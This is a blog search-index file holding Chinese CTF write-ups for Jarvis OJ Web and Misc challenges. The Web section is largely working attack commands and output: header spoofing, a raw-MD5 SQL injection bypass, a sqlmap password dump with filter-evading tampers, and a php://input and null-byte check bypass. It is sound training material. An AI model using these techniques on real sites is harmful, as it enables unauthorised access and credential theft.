<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jarvis OJ writeup (Web部分)</title>
      <link href="/2019/07/09/jarvis-OJ-writeup-Web%E9%83%A8%E5%88%86/"/>
      <url>/2019/07/09/jarvis-OJ-writeup-Web%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>使用curl的—local-port参数就行，但是不知道为什么我的mac和虚拟机都不行，估计是学校网最后有个nat所以端口会变，换了服务器就好了。还要注意使用1024编号以下的端口需要root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@(none):~<span class="comment"># curl --local-port 51  http://web.jarvisoj.com:32770</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here<span class="string">'s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>加个XFF头就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl web.jarvisoj.com:32774 -H<span class="string">"X-ForWarded-For: 127.0.0.1"</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 150&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here<span class="string">'s your flag:PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h2><p>response里发现hint</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: "<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p>php官方对md5函数是这么描述的</p><blockquote><p>md5 ( string $str [, bool $raw_output = FALSE ] ) : string`<br>Calculates the MD5 hash of str using the » RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash.</p><p>str<br>The string.<br>raw_output<br>If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p></blockquote><p>它用的是字符串的拼接,没有任何过滤，那么只要构造字符串的md5转成字符串是<code>’ or ‘xxx</code>xxx的值为<code>true</code>就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -X POST -d <span class="string">"pass=ffifdyop"</span> http://web.jarvisoj.com:32772/ </span><br><span class="line">Correct pass!! Your Flag: PCTF&#123;R4w_md5_is_d4ng3rous&#125;</span><br><span class="line">&lt;form action=<span class="string">"/"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  password: &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"pass"</span> /&gt;</span><br><span class="line">  &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>抓包发现请求了一个showimg.php<br><img src="/images/jarvis-OJ-Web/56F4FDA0-671A-418F-84E0-07AEAC6BB7D8.png" alt="神盾局的秘密"><br>base64解一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ echo &quot;c2hpZWxkLmpwZw==&quot;|base64 -d -</span><br><span class="line">shield.jpg%</span><br></pre></td></tr></table></figure><p>直接换个index.php上去看看</p><h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>打开发现是个登陆界面，随便试了试admin,123456提示密码错误</p><p><img src="/images/jarvis-OJ-Web/E1184B2F-FB95-4030-BFB1-908A856D259B.png" alt="Simple Injection"><br>又试了试admin ‘ or 1 = 1 # ，123456 发现提示用户名错误</p><p><img src="/images/jarvis-OJ-Web/3FED12B1-0C17-44A8-8C60-1B3FD866CE96.png" alt="Simple Injection"><br>那么通过这两字符串就能判断是否注入成功，判读注入的标志有了，现在该测试过滤了、最后发现过滤了and or之类的<br>使用sqlmap的space2comment symboliclogical这两temper绕过一下就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap --data=&quot;username=admin&amp;password=kslda&quot; -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --batch --dbms=mysql --level 3 -v 3 --string &quot;密码错误&quot; --tamper &quot;space2comment,symboliclogical&quot; --dbms=mysql -T admin -C password --dump</span><br></pre></td></tr></table></figure><p><img src="/images/jarvis-OJ-Web/1BC533F1-6DA9-4E0C-BD2B-08254E70CFC6.png" alt="Simple Injection"></p><p><img src="/images/jarvis-OJ-Web/A5F768E9-7FA4-4F8F-84FA-03B2FD2F0396.png" alt="Simple Injection"></p><p><img src="/images/jarvis-OJ-Web/5EDA8678-822A-4778-B7D7-AA4B272512FE.png" alt="Simple Injeciton"><br>flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>查看源代码发现 index.phps文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要过几个check</p><ul><li>使用字符串绕过id的check</li><li>使用php伪协议(php://input data:// 等)绕过a的check</li><li>使用eregi的%00截断特性绕过b的check<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -X POST -d &apos;1112 is a nice lab!&apos;  &apos;web.jarvisoj.com:32780/index.php?id=asdas&amp;a=php://input&amp;b=%0011111111233&apos;</span><br><span class="line">&lt;!--index.phps--&gt;Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure></li></ul><p>访问<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</code>发现是个注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&quot;</span><br><span class="line">hi666</span><br><span class="line">➜  ~ curl &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&apos;&quot;</span><br><span class="line">SELECT * FROM content WHERE id=1&apos;</span><br></pre></td></tr></table></figure><h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><p>右键查看源代码发现</p><p><img src="/images/jarvis-OJ-Web/771FAB6A-0E9D-4E74-B164-64E1A033CB30.png" alt="api"><br>直接访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32782/proxy.php?url=www.baidu.com</span><br></pre></td></tr></table></figure><p>弹出百度页面</p>]]></content>
      
      
      <categories>
          
          <category> CTF writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jarvisOJ </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvis OJ writeup (Misc部分)</title>
      <link href="/2019/07/09/jarvis-OJ-writeup-Misc%E9%83%A8%E5%88%86/"/>
      <url>/2019/07/09/jarvis-OJ-writeup-Misc%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="简单网管协议"><a href="#简单网管协议" class="headerlink" title="简单网管协议"></a>简单网管协议</h2><p>发现snmp协议，跟踪UDP流可发现<br><img src="/images/jarvis-OJ-Misc/43D73CF5-1166-45A4-916A-DD6608F518BD.png" alt="简单网管协议"><br>flag{077149a68b9d4f25f52bb11530f44028}</p><h2 id="炫酷的战队Logo"><a href="#炫酷的战队Logo" class="headerlink" title="炫酷的战队Logo"></a>炫酷的战队Logo</h2><p>下载看到是张bmp图片，头部有缺失，补上424D，保存发现只是张普通的图片，发现最后有IEND的png结尾，使用dd将其裁剪出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=./phrack.bmp of=out.png ibs=0x1171a9 skip=1 count=1</span><br></pre></td></tr></table></figure><p>发现ihdr有错误，根据ihdr crc32爆破出相应的w,h</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./out.png"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">crc = struct.unpack(<span class="string">"&gt;I"</span>,data[<span class="number">29</span>:<span class="number">33</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        ihdr = <span class="string">b"IHDR"</span>+ struct.pack(<span class="string">"&gt;I"</span>,w) + struct.pack(<span class="string">"&gt;I"</span>,h)+<span class="string">b"\x08\x02\x00\x00\x00"</span></span><br><span class="line">        <span class="keyword">if</span> crc == binascii.crc32(ihdr):</span><br><span class="line">            data = data[:<span class="number">12</span>]+ihdr+data[<span class="number">29</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"out2.png"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#PCTF&#123;CrC32_i5_Useful_iN_pNG&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h2><p>Wireshark打开，发现开头是个icmp，推测每次扫描之前都要用icmp测试一下，然后过滤icmp<br><img src="/images/jarvis-OJ-Misc/28493DD3-19B0-4BFB-BA6B-9F75049E29A5.png" alt="Scan"><br>从后往前一个个试，最后发现为155989这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n 155989|openssl dgst -sha256</span><br><span class="line"></span><br><span class="line"><span class="comment">#PCTF&#123;0be2407512cc2a40bfb570464757fd56cd0a1d33f0bf3824dfed4f0119133c12&#125;</span></span><br></pre></td></tr></table></figure><h2 id="远程登录协议"><a href="#远程登录协议" class="headerlink" title="远程登录协议"></a>远程登录协议</h2><p>过滤telnet追踪TCP流，发现<br><img src="/images/jarvis-OJ-Misc/AB2D0376-4FAB-4B68-A2E8-E9B013D9D4C2.png" alt="远程登陆协议"><br>FLAG:f69dd04e38ef85e38b2f148475ce32bc</p><h2 id="shell流量分析"><a href="#shell流量分析" class="headerlink" title="shell流量分析"></a>shell流量分析</h2><p>追踪TCP流发现一个python脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">__author__ = <span class="string">'Aklis'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">  IV = message[:<span class="number">16</span>]</span><br><span class="line">  length = <span class="number">16</span></span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + <span class="string">'\0'</span> * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line"></span><br><span class="line">message = IV + <span class="string">'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(message)</span><br><span class="line"></span><br><span class="line">example = encrypt(message, <span class="string">'Qq4wdrhhyEWe4qBF'</span>)</span><br><span class="line"><span class="keyword">print</span> example</span><br><span class="line">example = decrypt(example, <span class="string">'Qq4wdrhhyEWe4qBF'</span>) </span><br><span class="line"><span class="keyword">print</span> example</span><br></pre></td></tr></table></figure><p>后边发现密文：</p><p><img src="/images/jarvis-OJ-Misc/B29669F8-9B3A-479E-BD59-2944F4B82507.png" alt="shell流量分析"><br>将脚本改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line">example = decrypt(message, <span class="string">'Qq4wdrhhyEWe4qBF'</span>)</span><br><span class="line"><span class="keyword">print</span> example</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag is hctf&#123;n0w_U_w111_n0t_f1nd_me&#125;</span></span><br></pre></td></tr></table></figure><h2 id="webshell分析"><a href="#webshell分析" class="headerlink" title="webshell分析"></a>webshell分析</h2><p>分析流量发现一个访问了一个ironshell.php的文件，猜测这就是webshell   。用如下规则过滤出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 115.28.102.80 &amp;&amp; http.request.uri matches &quot;ironshell.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/jarvis-OJ-Misc/95DE1B46-85BD-4386-9D4C-E24E7A6E59AF.png" alt="webshell分析"><br>发现最后一个包的url里有个flag猜测这个包里就有要的关键数据，跟踪TCP流将其数据dump出来保存到一个html里<br><img src="/images/jarvis-OJ-Misc/F29E6C85-6FB7-497C-AC44-76F683AD01CB.png" alt="webshell分析"><br>发现疑似flag的东西，解base64发现是个url访问是张二维码，扫码可得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  findwebshell <span class="built_in">echo</span> <span class="string">"aHR0cHM6Ly9kbi5qYXJ2aXNvai5jb20vY2hhbGxlbmdlZmlsZXMvQWJUekEyWXRlRmpHaFBXQ2Z0cmFvdVZEM0I2ODRhOUEuanBn"</span>|base64 -D</span><br><span class="line">https://dn.jarvisoj.com/challengefiles/AbTzA2YteFjGhPWCftraouVD3B684a9A.jpg</span><br><span class="line"><span class="comment">#flag&#123;1542ae716e47576e1f3e36326a23e72e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>binwalk分析下发现有个压缩包</p><p><img src="/images/jarvis-OJ-Misc/812B682A-DC9F-412E-A085-9931A7BD5430.png" alt="flag"><br>猜测LSB隐写，stegsolve打开发现一个zip</p><p><img src="/images/jarvis-OJ-Misc/9FAF7A68-2F3C-4528-A820-AE004CD204F6.png" alt="flag"><br>Dump发现打不开，再来binwalk一下，解出来一个elf文件。。。<br><img src="/images/jarvis-OJ-Misc/B3F25C00-CBD9-45E9-B32C-E9F8431870C9.png" alt="flag"><br>ida打开<br><img src="/images/jarvis-OJ-Misc/16AD36BE-EA28-4642-8C9E-A73983FD66CE.png" alt="flag"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hctf&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc100"><a href="#misc100" class="headerlink" title="misc100"></a>misc100</h2><p>下来看看是个apk，直接用dex2jar转诊jar然后jd-gui打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  easy100 d2j-dex2jar.sh easy100.apk</span><br></pre></td></tr></table></figure><p><img src="/images/jarvis-OJ-Misc/AEF4C0FD-4FF9-4A4F-BAE9-966C4D956AB9.png" alt="misc100"><br>直接就看到这个，猜测这应该就是加密之后的，继续看</p><p><img src="/images/jarvis-OJ-Misc/C2B91023-FEDC-4F21-984D-632C42052014.png" alt="misc100"><br>这里调用了MainActivity.a，两个参数，一个是MainActiviry.a(this.a)的返回值，一个是输入的字符串<br>然后看看c.a()都干了啥，c这个类里有2个叫a的方法，应该是重写的，先看2个参数的那个</p><p><img src="/images/jarvis-OJ-Misc/711134FB-F7DA-4C82-A282-94EAA267F4FB.png" alt="misc100"><br>New了一个a类，</p><p><img src="/images/jarvis-OJ-Misc/9ACBB75F-607F-4C5A-8F35-E1E9711DE14C.png" alt="misc100"><br>所以当初调用的时候第一个参数是key，第二个参数就是明文然而我并不知道第一iv是啥，一度以为是空字符串的md5…本垃圾不懂java，不太懂，，研究了一下，貌似这个MaivAvtive.p()没人调用，就猜第一个参数应该是这个v。<br>然后将v的每两位换一下。写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack <span class="keyword">as</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./easy100/assets/url.png"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    change_key = f.read()[<span class="number">144</span>:<span class="number">144</span>+<span class="number">16</span>]</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">key = bytearray()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">    key.append(change_key[_+<span class="number">1</span>])</span><br><span class="line">    key.append(change_key[_])</span><br><span class="line"></span><br><span class="line">a = [<span class="number">21</span>, <span class="number">-93</span>, <span class="number">-68</span>, <span class="number">-94</span>, <span class="number">86</span>, <span class="number">117</span>, <span class="number">-19</span>, <span class="number">-68</span>, <span class="number">-92</span>, <span class="number">33</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">-15</span>, <span class="number">-13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">103</span>, <span class="number">-18</span>, <span class="number">81</span>, <span class="number">30</span>, <span class="number">68</span>, <span class="number">54</span>, <span class="number">-93</span>, <span class="number">44</span>, <span class="number">-23</span>, <span class="number">93</span>, <span class="number">98</span>, <span class="number">5</span>, <span class="number">59</span>]</span><br><span class="line">b = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> a:</span><br><span class="line">    b+=p(<span class="string">"b"</span>,_ )</span><br><span class="line"></span><br><span class="line">c = AES.new(bytes(key),AES.MODE_ECB)</span><br><span class="line">m = c.decrypt(b)</span><br><span class="line">print(m)</span><br><span class="line"><span class="comment">#LCTF&#123;1t's_rea1ly_an_ea3y_ap4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="you-need-python"><a href="#you-need-python" class="headerlink" title="you_need_python"></a>you_need_python</h2><p>解压一看是个脚本和一个乱码文件，文件名根据提示rfc4042知道那个文件是utf9编码的解码后是个字符串加加减减的，然后flag.py里的是python的字节码，写个脚本将其转成pyc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_pyc</span><span class="params">(code,filename)</span>:</span></span><br><span class="line">    data = bytearray(imp.get_magic())</span><br><span class="line">    data += struct.pack(<span class="string">"&lt;L"</span>,int(time.time()))</span><br><span class="line">    data += code</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">code = zlib.decompress(base64.b64decode(<span 